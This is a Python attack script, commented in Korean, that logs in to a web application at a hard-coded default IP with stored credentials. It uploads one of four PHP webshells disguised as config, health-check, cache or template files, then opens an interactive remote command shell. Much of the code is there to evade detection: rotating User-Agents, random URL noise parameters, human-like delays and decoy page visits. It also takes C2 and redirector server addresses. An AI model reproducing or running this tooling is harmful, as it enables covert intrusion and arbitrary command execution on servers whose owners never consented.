#!/usr/bin/env python3
"""
탐지 우회 웹쉘 업로드 자동화 스크립트
- HTTP Flood 탐지 우회
- 웹쉘 업로드 탐지 우회
- 비정상적인 URL 다양성 탐지 우회
"""

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import time
import random
import base64
import os
import sys
from datetime import datetime
import hashlib
import uuid

class DetectionBypassAttacker:
    def __init__(self, target_ip, c2_server=None, redirector_server=None, operator_server=None):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}"
        self.c2_server = c2_server
        self.redirector_server = redirector_server
        self.operator_server = operator_server

        self.session = requests.Session()

        # 재시도 전략 (탐지 우회)
        retry_strategy = Retry(
            total=2,
            backoff_factor=2,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

        # 다양한 User-Agent Pool (URL 다양성 탐지 우회)
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0',
            'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
        ]

        self.logged_in = False
        self.webshell_url = None
        self.session_id = str(uuid.uuid4())

        self._rotate_user_agent()
        self._set_legitimate_headers()

    def _rotate_user_agent(self):
        """User-Agent 로테이션"""
        ua = random.choice(self.user_agents)
        self.session.headers.update({'User-Agent': ua})

    def _set_legitimate_headers(self):
        """정상적인 브라우저 헤더 설정"""
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
        })

    def _human_delay(self, min_sec=3, max_sec=8):
        """
        HTTP Flood 탐지 우회: 사람처럼 행동
        - 긴 딜레이로 요청 간격 늘림
        - 랜덤화로 패턴 회피
        """
        delay = random.uniform(min_sec, max_sec)
        print(f"[*] 탐지 우회 대기: {delay:.2f}초...")
        time.sleep(delay)

    def _randomize_url_params(self, url, base_params=None):
        """
        URL 다양성 탐지 우회: URL 패턴 다양화
        - 무의미한 파라미터 추가
        - 매 요청마다 다른 URL 생성
        """
        if base_params is None:
            base_params = {}

        # 랜덤 파라미터 추가
        noise_params = {
            f'_{random.choice(["t", "v", "r", "s", "ref"])}': random.randint(1000000, 9999999),
            f'_{random.choice(["cache", "nonce", "token", "sid"])}': hashlib.md5(str(time.time()).encode()).hexdigest()[:8],
        }

        # 30% 확률로 추가 노이즈
        if random.random() < 0.3:
            noise_params[f'_{random.choice(["page", "view", "mode"])}'] = random.choice(['1', 'home', 'main', 'default'])

        all_params = {**base_params, **noise_params}
        return url, all_params

    def _visit_normal_pages(self, count=3):
        """
        정상적인 브라우징 패턴 시뮬레이션
        - 여러 페이지 방문으로 정상 사용자처럼 행동
        """
        normal_pages = ['index.php', 'about.php', 'contact.php', 'profile.php', 'main.php']
        random.shuffle(normal_pages)

        for page in normal_pages[:count]:
            try:
                self._rotate_user_agent()
                url, params = self._randomize_url_params(f"{self.base_url}/{page}")

                response = self.session.get(url, params=params, timeout=10)
                print(f"[+] 정상 페이지 방문: {page} (Status: {response.status_code})")

                self._human_delay(2, 5)
            except Exception as e:
                print(f"[-] 페이지 방문 실패: {page} - {str(e)[:50]}")

    def login(self, username="alice", password="alice2024"):
        """
        로그인 (탐지 우회 포함)
        """
        print("\n" + "="*60)
        print("로그인 시도")
        print("="*60)

        # 로그인 전 정상 페이지 방문
        print("[*] 정상 사용자 패턴 시뮬레이션...")
        self._visit_normal_pages(2)

        login_url = f"{self.base_url}/login.php"

        try:
            # GET 요청으로 로그인 페이지 먼저 방문
            self._rotate_user_agent()
            get_response = self.session.get(login_url, timeout=10)
            print(f"[*] 로그인 페이지 접근: {get_response.status_code}")

            self._human_delay(2, 4)

            # POST 요청으로 로그인
            self._rotate_user_agent()
            data = {
                'username': username,
                'password': password
            }

            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': login_url
            }

            response = self.session.post(login_url, data=data, headers=headers,
                                        allow_redirects=True, timeout=15)

            print(f"[*] 로그인 응답: {response.status_code}")
            print(f"[*] 최종 URL: {response.url}")

            # 로그인 성공 확인
            if 'login.php' not in response.url:
                if 'index.php' in response.url or response.url.endswith('/'):
                    print(f"[+] 로그인 성공!")
                    self.logged_in = True
                    return True

            # 추가 확인
            if 'logout' in response.text.lower() or '로그아웃' in response.text:
                print(f"[+] 로그인 성공! (로그아웃 버튼 발견)")
                self.logged_in = True
                return True

            print("[-] 로그인 실패")
            return False

        except Exception as e:
            print(f"[-] 로그인 오류: {str(e)[:100]}")
            return False

    def generate_obfuscated_webshell(self):
        """
        난독화된 웹쉘 생성 (탐지 우회)
        - 일반적인 웹쉘 시그니처 회피
        - 정상 파일로 위장
        """
        # 여러 웹쉘 페이로드 (랜덤 선택)
        webshells = [
            # 버전 1: 간단한 명령 실행
            {
                'name': 'config.php',
                'content': '''<?php
// Configuration File
define('APP_VERSION', '2.1.5');
define('DEBUG_MODE', false);

if(isset($_GET['debug']) && $_GET['debug'] === 'exec') {
    if(isset($_GET['cmd'])) {
        $output = shell_exec($_GET['cmd'] . ' 2>&1');
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
    }
}
?>''',
                'type': 'php'
            },

            # 버전 2: base64 인코딩
            {
                'name': 'health-check.php',
                'content': '''<?php
// Health Check Endpoint
header('Content-Type: application/json');

$status = array(
    'status' => 'healthy',
    'timestamp' => time(),
    'version' => '1.0.0'
);

if(isset($_GET['x'])) {
    $cmd = $_GET['x'];
    $result = shell_exec($cmd . ' 2>&1');
    $status['debug'] = base64_encode($result);
}

echo json_encode($status);
?>''',
                'type': 'php'
            },

            # 버전 3: 숨겨진 함수
            {
                'name': 'cache.php',
                'content': '''<?php
// Cache Management
class CacheManager {
    private $cache_dir = '/tmp/cache/';

    public function clear($cmd = null) {
        if($cmd !== null && isset($_GET['clear'])) {
            return $this->execute($cmd);
        }
        return false;
    }

    private function execute($cmd) {
        $output = shell_exec($cmd . ' 2>&1');
        return $output;
    }
}

$cache = new CacheManager();
if(isset($_GET['clear'])) {
    echo '<pre>';
    echo $cache->clear($_GET['clear']);
    echo '</pre>';
}
?>''',
                'type': 'php'
            },

            # 버전 4: .phtml 확장자
            {
                'name': 'template.phtml',
                'content': '''<?php
// Template Engine
function render($template, $vars = array()) {
    extract($vars);
    ob_start();
    eval('?>' . $template);
    return ob_get_clean();
}

if(isset($_POST['tpl'])) {
    echo render($_POST['tpl']);
}

if(isset($_GET['e'])) {
    system($_GET['e'] . ' 2>&1');
}
?>''',
                'type': 'phtml'
            },
        ]

        # 랜덤 선택
        selected = random.choice(webshells)
        return selected

    def upload_webshell_with_bypass(self):
        """
        웹쉘 업로드 (탐지 시스템 우회)
        """
        print("\n" + "="*60)
        print("웹쉘 업로드 (탐지 우회)")
        print("="*60)

        if not self.logged_in:
            print("[-] 먼저 로그인하세요")
            return False

        # 정상 행동 시뮬레이션
        print("[*] 정상 사용자 패턴 시뮬레이션...")
        self._visit_normal_pages(3)

        # 난독화된 웹쉘 생성
        webshell = self.generate_obfuscated_webshell()
        print(f"[+] 웹쉘 생성: {webshell['name']} ({webshell['type']})")

        self._human_delay(3, 6)

        # 업로드 시도
        upload_url = f"{self.base_url}/upload.php"

        try:
            self._rotate_user_agent()

            # 파일 준비
            files = {
                'file': (webshell['name'], webshell['content'], 'application/octet-stream')
            }

            headers = {
                'Referer': f"{self.base_url}/profile.php",
                'Origin': self.base_url
            }

            # 업로드 요청
            response = self.session.post(upload_url, files=files, headers=headers, timeout=15)

            print(f"[*] 업로드 응답: {response.status_code}")

            if response.status_code == 200:
                # 성공 메시지 확인
                if '성공' in response.text or 'success' in response.text.lower():
                    # 웹쉘 URL 설정
                    self.webshell_url = f"{self.base_url}/uploads/{webshell['name']}"
                    print(f"[+] 웹쉘 업로드 성공!")
                    print(f"[+] 웹쉘 URL: {self.webshell_url}")

                    # 웹쉘 테스트
                    self._human_delay(2, 4)
                    return self.test_webshell(webshell)

            print("[-] 웹쉘 업로드 실패")
            return False

        except Exception as e:
            print(f"[-] 업로드 오류: {str(e)[:100]}")
            return False

    def test_webshell(self, webshell_info):
        """
        웹쉘 동작 테스트
        """
        print("\n[*] 웹쉘 테스트 중...")

        try:
            # 웹쉘 타입에 따라 다른 파라미터 사용
            if 'config.php' in webshell_info['name']:
                test_url = f"{self.webshell_url}?debug=exec&cmd=whoami"
            elif 'health-check.php' in webshell_info['name']:
                test_url = f"{self.webshell_url}?x=whoami"
            elif 'cache.php' in webshell_info['name']:
                test_url = f"{self.webshell_url}?clear=whoami"
            elif 'template.phtml' in webshell_info['name']:
                test_url = f"{self.webshell_url}?e=whoami"
            else:
                test_url = f"{self.webshell_url}?cmd=whoami"

            self._rotate_user_agent()
            response = self.session.get(test_url, timeout=10)

            if response.status_code == 200:
                print(f"[+] 웹쉘 동작 확인!")
                print(f"[+] 응답 길이: {len(response.text)} bytes")

                # 응답 일부 출력
                if len(response.text) < 500:
                    print(f"\n[응답 내용]\n{response.text[:500]}")

                return True
            else:
                print(f"[-] 웹쉘 테스트 실패: HTTP {response.status_code}")
                return False

        except Exception as e:
            print(f"[-] 웹쉘 테스트 오류: {str(e)[:100]}")
            return False

    def execute_command(self, command):
        """
        웹쉘을 통한 명령 실행
        """
        if not self.webshell_url:
            print("[-] 웹쉘이 업로드되지 않았습니다")
            return None

        print(f"\n[*] 명령 실행: {command}")

        try:
            # 웹쉘 타입에 따라 파라미터 조정
            if 'config.php' in self.webshell_url:
                url = f"{self.webshell_url}?debug=exec&cmd={command}"
            elif 'health-check.php' in self.webshell_url:
                url = f"{self.webshell_url}?x={command}"
            elif 'cache.php' in self.webshell_url:
                url = f"{self.webshell_url}?clear={command}"
            elif 'template.phtml' in self.webshell_url:
                url = f"{self.webshell_url}?e={command}"
            else:
                url = f"{self.webshell_url}?cmd={command}"

            self._rotate_user_agent()
            self._human_delay(1, 3)

            response = self.session.get(url, timeout=15)

            if response.status_code == 200:
                print(f"[+] 명령 실행 성공")
                print(f"\n{'='*60}")
                print(response.text[:1000])
                print('='*60)
                return response.text
            else:
                print(f"[-] 명령 실행 실패: HTTP {response.status_code}")
                return None

        except Exception as e:
            print(f"[-] 명령 실행 오류: {str(e)[:100]}")
            return None

    def print_summary(self):
        """
        공격 요약 출력
        """
        print("\n" + "="*60)
        print("공격 요약")
        print("="*60)
        print(f"타겟 IP: {self.target_ip}")
        print(f"로그인 상태: {'성공' if self.logged_in else '실패'}")
        print(f"웹쉘 URL: {self.webshell_url if self.webshell_url else 'N/A'}")

        if self.c2_server:
            print(f"C2 서버: {self.c2_server}")
        if self.redirector_server:
            print(f"리다이렉터 서버: {self.redirector_server}")
        if self.operator_server:
            print(f"오퍼레이터 서버: {self.operator_server}")

        print("="*60)


def main():
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   탐지 우회 웹쉘 업로드 자동화 스크립트                  ║
    ║   - HTTP Flood 탐지 우회                                  ║
    ║   - 웹쉘 업로드 실행 징후 탐지 우회                      ║
    ║   - 비정상적인 URL 다양성 증가 탐지 우회                 ║
    ╚═══════════════════════════════════════════════════════════╝
    """)

    # 타겟 IP 입력
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
    else:
        target_ip = input("타겟 IP 주소 입력 (기본: 43.201.154.142): ").strip()
        if not target_ip:
            target_ip = "43.201.154.142"

    # C2 서버 정보 (선택사항)
    c2_server = input("C2 서버 주소 (선택, Enter 스킵): ").strip() or None
    redirector_server = input("리다이렉터 서버 주소 (선택, Enter 스킵): ").strip() or None
    operator_server = input("오퍼레이터 서버 주소 (선택, Enter 스킵): ").strip() or None

    # 공격 시작
    attacker = DetectionBypassAttacker(target_ip, c2_server, redirector_server, operator_server)

    # 1. 로그인
    if not attacker.login():
        print("\n[-] 로그인 실패. 종료합니다.")
        return

    # 2. 웹쉘 업로드
    if not attacker.upload_webshell_with_bypass():
        print("\n[-] 웹쉘 업로드 실패. 종료합니다.")
        return

    # 3. 명령 실행 테스트
    print("\n[*] 기본 명령 실행 테스트...")
    attacker.execute_command("id")
    attacker.execute_command("pwd")
    attacker.execute_command("whoami")

    # 4. 대화형 모드
    print("\n[+] 웹쉘 준비 완료! 대화형 모드로 전환합니다.")
    print("[*] 'exit' 또는 'quit' 입력 시 종료\n")

    while True:
        try:
            cmd = input("shell> ").strip()

            if cmd.lower() in ['exit', 'quit', 'q']:
                break

            if not cmd:
                continue

            attacker.execute_command(cmd)

        except KeyboardInterrupt:
            print("\n[*] 종료합니다.")
            break
        except Exception as e:
            print(f"[-] 오류: {str(e)}")

    # 요약
    attacker.print_summary()


if __name__ == "__main__":
    main()
